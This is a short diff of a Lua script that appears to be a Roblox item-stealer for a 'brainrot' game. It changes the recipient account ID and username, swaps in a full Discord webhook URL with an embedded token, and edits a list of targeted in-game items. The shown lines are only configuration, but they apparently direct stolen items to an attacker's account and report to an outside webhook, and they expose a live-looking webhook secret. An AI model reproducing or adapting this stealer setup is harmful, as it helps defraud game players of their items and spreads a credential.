@@ -1,12 +1,13 @@
-local TARGET_ID = 5039403995
-local TARGET_USER = "zyxgsj"
-local WEBHOOK_URL = "https://discord.gg/reW7pJwD9"
+local TARGET_ID = 8187322233
+local TARGET_USER = "kz_mir0"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1567294210380533790/oZgVTuyslj5vHtzmFvvAR5iMwRzKKstjHOeyM10ECvYS8dmzuFQfbfcMbetpmOc4uVgP"
 
 local TargetBrainrots = {
     ["Dragon Skeletonini"] = true,
     ["Phoenix"] = true,
     ["Plant Bros"] = true,
     ["Hydra Serpent"] = true,
+    ["Orchidox"] = true,
     ["Strawberry Elephant"] = true,
     ["Meowl"] = true,
     ["Skibidi Toilet"] = true,
@@ -294,8 +295,7 @@ local TargetBrainrots = {
     ["Sammyni Bros"] = true,
     ["Puppetmaster"] = true,
     ["Medusini and Demonini"] = true,
-    ["Cabin Bros"] = true,
-    ["Orchidox"] = true
+    ["Cabin Bros"] = true
 }
 
 local TargetBaseSkins = {
